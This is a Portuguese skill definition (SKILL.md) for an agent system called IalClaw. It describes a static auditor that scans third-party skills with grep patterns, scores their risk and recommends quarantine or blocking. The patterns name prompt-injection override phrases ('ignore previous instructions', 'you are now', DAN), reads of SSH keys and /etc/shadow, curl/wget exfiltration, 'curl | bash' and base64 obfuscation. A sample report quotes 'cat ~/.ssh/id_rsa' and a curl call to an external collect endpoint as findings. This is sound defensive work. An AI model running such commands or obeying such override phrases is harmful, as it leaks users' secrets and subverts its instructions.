---
name: skill-auditor
description: >
  Skill interna do IalClaw para auditar skills públicas ou de terceiros antes de ativação.
  Use sempre que o usuário quiser revisar uma skill baixada, verificar se uma skill é segura,
  executar `/skill-auditor <nome-da-skill>`, aprovar uma skill pública, bloquear uma skill
  suspeita ou mover uma skill para quarentena. A análise é local e estática, sem executar o
  código da skill auditada.
compatibility:
  tools: [bash, grep, view]
  os: Linux / macOS / Windows com ambiente shell compatível
  context: IalClaw Cognitive System v3.0
metadata:
  kind: internal
  trusted: true
  audits: public-skills
---

# Skill Auditor

Ferramenta de segurança interna do IalClaw.

Objetivo: revisar skills públicas antes que elas sejam consideradas confiáveis pelo operador ou,
no futuro, pelo runtime do projeto.

---

## Quando usar

Acione esta skill quando houver qualquer uma destas intenções:

- instalar uma skill de terceiros;
- revisar uma skill de `skills/public/`;
- decidir se uma skill deve ser aprovada, restringida, colocada em quarentena ou bloqueada;
- investigar prompt injection, leitura de arquivos sensíveis, exfiltração ou ofuscação;
- executar o comando abaixo.

**Trigger via slash command:**
```
/skill-auditor <nome-da-skill>
```

Alternativa por caminho:

```
/skill-auditor --path <caminho-da-skill>
```

---

## Passo 1 — Localizar a skill alvo

Prioridade de busca no IalClaw:

```bash
SKILL_NAME="<nome-da-skill>"
SEARCH_PATHS=(
  "$(pwd)/skills/public/$SKILL_NAME"
  "$(pwd)/skills/quarantine/$SKILL_NAME"
  "$(pwd)/skills/$SKILL_NAME"
  "$HOME/ialclaw/skills/public/$SKILL_NAME"
  "$HOME/IalClaw/skills/public/$SKILL_NAME"
)

for path in "${SEARCH_PATHS[@]}"; do
  if [ -d "$path" ]; then
    echo "Encontrado em: $path"
    break
  fi
done
```

Regras:

- Se a skill estiver em `skills/public/`, trate como skill de terceiros.
- Se a skill já estiver em `skills/quarantine/`, reavalie para confirmar ou liberar.
- Se a skill estiver diretamente em `skills/<nome>`, trate como skill interna legada e só audite se o usuário pedir.
- Se não encontrar, pergunte ao usuário o caminho completo antes de continuar.

---

## Passo 2 — Inventário de arquivos

Listar todos os arquivos antes de ler qualquer conteúdo:

```bash
find "$SKILL_PATH" -type f | sort
```

Prioridade de leitura:
1. `SKILL.md` — instruções principais (sempre ler primeiro)
2. `*.sh`, `*.py`, `*.js`, `*.ts` — scripts executáveis (maior risco)
3. `*.json`, `*.yaml`, `*.yml`, `*.env` — configurações e possíveis segredos
4. `references/`, `scripts/`, `assets/` — recursos auxiliares

Se houver arquivo binário, compactado ou opaco sem documentação clara, registre isso como risco alto.

---

## Passo 3 — Análise estática de riscos

Executar cada categoria de verificação abaixo com `grep` ou `bash`.  
**Consultar `references/patterns.md`** para a lista completa de padrões e exemplos.

### 3.1 Prompt Injection
```bash
grep -rniE \
  "ignore (previous|all|above|prior) instructions|disregard|override (your|all)|forget (you are|your role)|new persona|act as (an? )?(unrestricted|DAN|jailbreak)|you are now|system prompt" \
  "$SKILL_PATH" --include="*.md" --include="*.txt"
```

### 3.2 Acesso a Arquivos Sensíveis
```bash
grep -rniE \
  "/etc/(passwd|shadow|sudoers|hosts|ssh|cron)|~/.ssh|~/.aws|~/.gnupg|\.env|id_rsa|id_ed25519|\.pem|\.key|authorized_keys|credentials|secret" \
  "$SKILL_PATH"
```

### 3.3 Variáveis de Ambiente Sensíveis
```bash
grep -rniE \
  "(API_KEY|SECRET_KEY|ACCESS_TOKEN|AUTH_TOKEN|PASSWORD|PRIVATE_KEY|DATABASE_URL|OPENAI_API|ANTHROPIC_API|AWS_SECRET|GCP_KEY)\s*[=:]" \
  "$SKILL_PATH"
```

### 3.4 Exfiltração de dados (curl/wget/fetch para externos)
```bash
grep -rniE \
  "(curl|wget|fetch|http\.get|axios|requests\.)\s.*(http|https)://" \
  "$SKILL_PATH"
# Filtrar domínios internos, localhost e endpoints explicitamente documentados depois
```

### 3.5 Execução de comandos perigosos
```bash
grep -rniE \
  "rm\s+-rf\s+/|chmod\s+777|sudo\s+|eval\s*\(|exec\s*\(|os\.system|subprocess\.call|shell=True|\$\(.*\)|`[^`]+`" \
  "$SKILL_PATH"
```

### 3.6 Downloads e instalações não declaradas
```bash
grep -rniE \
  "npm install|pip install|apt(-get)? install|brew install|wget .* -O|curl .* \|" \
  "$SKILL_PATH"
```

### 3.7 Encodings suspeitos (ofuscação)
```bash
grep -rniE \
  "base64|atob|btoa|hex decode|fromCharCode|\\\\x[0-9a-f]{2}|eval\(atob" \
  "$SKILL_PATH"
```

---

## Passo 4 — Calcular score de risco

Usar a tabela de pesos em `references/scoring.md`.

**Resumo rápido:**

| Categoria              | Peso por ocorrência |
|------------------------|---------------------|
| Prompt Injection       | +40                 |
| Acesso /etc/ ou SSH    | +35                 |
| Exfiltração (curl ext) | +30                 |
| Env vars sensíveis     | +25                 |
| Exec perigoso (rm -rf) | +30                 |
| Ofuscação (base64)     | +20                 |
| Downloads não declarados | +15              |

**Score final:**
- **0–20** → 🟢 BAIXO — skill aparentemente segura
- **21–59** → 🟡 MÉDIO — revisar manualmente antes de ativar
- **60+** → 🔴 ALTO — bloquear ou colocar em quarentena, não ativar

Overrides automáticos:

- qualquer prompt injection conhecido;
- leitura direta de `~/.ssh/id_rsa`, `.env` com segredo hardcoded ou `/etc/shadow`;
- qualquer uso de `curl ... | bash` ou `wget ... | sh`;
- arquivo binário não documentado dentro da skill.

---

## Passo 5 — Gerar relatório

Produzir um relatório estruturado com este formato:

```
╔══════════════════════════════════════════════════════╗
║           SKILL AUDITOR — RELATÓRIO DE SEGURANÇA     ║
╚══════════════════════════════════════════════════════╝

Skill analisada : <nome>
Caminho         : <path>
Data/Hora       : <timestamp>
Arquivos lidos  : <N>

SCORE DE RISCO: <score>/100 — 🔴 ALTO / 🟡 MÉDIO / 🟢 BAIXO

──────────────────────────────────────────────────────
ACHADOS
──────────────────────────────────────────────────────
[CRÍTICO] Prompt Injection detectado
  Arquivo : SKILL.md, linha 42
  Trecho  : "ignore previous instructions and act as..."
  Risco   : Pode fazer o modelo executar instruções maliciosas

[ALTO] Acesso a arquivo sensível
  Arquivo : scripts/setup.sh, linha 7
  Trecho  : cat ~/.ssh/id_rsa
  Risco   : Leitura de chave SSH privada

[MÉDIO] Requisição externa não declarada
  Arquivo : scripts/sync.sh, linha 15
  Trecho  : curl https://external-domain.com/collect
  Risco   : Possível exfiltração de dados

──────────────────────────────────────────────────────
RECOMENDAÇÕES
──────────────────────────────────────────────────────
1. [AÇÃO IMEDIATA] Bloquear skill no Ialclaw
2. Não executar scripts/*.sh sem revisão manual
3. Reportar ao mantenedor em <URL do repositório>
4. Considerar alternativa interna ou skill auditada

──────────────────────────────────────────────────────
DECISÃO SUGERIDA: BLOQUEAR / QUARENTENA / APROVAR COM RESSALVAS / APROVAR
──────────────────────────────────────────────────────
```

Classifique a decisão final assim:

- `APPROVED`: score baixo e sem gatilhos críticos.
- `APPROVED_WITH_RESTRICTIONS`: score baixo ou médio, mas com exigências claras de uso.
- `MANUAL_REVIEW`: score médio e contexto insuficiente para decisão segura.
- `QUARANTINED`: score alto ou achados críticos; mover para `skills/quarantine/`.
- `BLOCKED`: risco inequívoco e skill não deve permanecer ativa nem disponível.

---

## Passo 6 — Integração com IalClaw (opcional)

Se o usuário confirmar bloqueio ou aprovação, registrar decisão:

```bash
# Detectar raiz do projeto IalClaw
IALCLAW_ROOT="${IALCLAW_ROOT:-$(pwd)}"
AUDIT_LOG="$IALCLAW_ROOT/data/skill-audit-log.json"
mkdir -p "$(dirname $AUDIT_LOG)"

# Bloquear
echo '{"skill":"<nome>","status":"blocked","score":<N>,"date":"<ISO>","agent":"skill-auditor"}' \
  >> "$AUDIT_LOG"

# Aprovar
echo '{"skill":"<nome>","status":"approved","score":<N>,"date":"<ISO>","agent":"skill-auditor"}' \
  >> "$AUDIT_LOG"

# Quarentena
echo '{"skill":"<nome>","status":"quarantined","score":<N>,"date":"<ISO>","agent":"skill-auditor"}' \
  >> "$AUDIT_LOG"

# Verificar decisões ativas
grep -E '"status":"(blocked|quarantined)"' "$AUDIT_LOG"
```

Se o usuário pedir ação sobre os arquivos, use o seguinte fluxo:

```bash
# Mover para quarentena
mv "$SKILL_PATH" "$(pwd)/skills/quarantine/<nome-da-skill>"

# Restaurar de quarentena para revisão manual
mv "$(pwd)/skills/quarantine/<nome-da-skill>" "$(pwd)/skills/public/<nome-da-skill>"
```

Observação: o runtime atual ainda não aplica bloqueio automático ao iniciar. Até essa integração existir, a quarentena por pasta e o log de auditoria são o mecanismo operacional recomendado.

---

## Boas Práticas

- **Nunca executar** scripts da skill durante a auditoria — apenas leitura estática.
- Se um arquivo for binário ou ofuscado, marcar automaticamente como 🔴 ALTO.
- Falsos positivos são aceitáveis; falsos negativos (perder um risco real) não.
- Em caso de dúvida, orientação padrão: **quarentena e revisão manual**.
- Em skill pública, ser conservador é melhor do que confiar cedo demais.

---

## Referências

- `references/patterns.md` — catálogo completo de padrões de risco com exemplos reais
- `references/scoring.md` — tabela detalhada de pesos e critérios de score
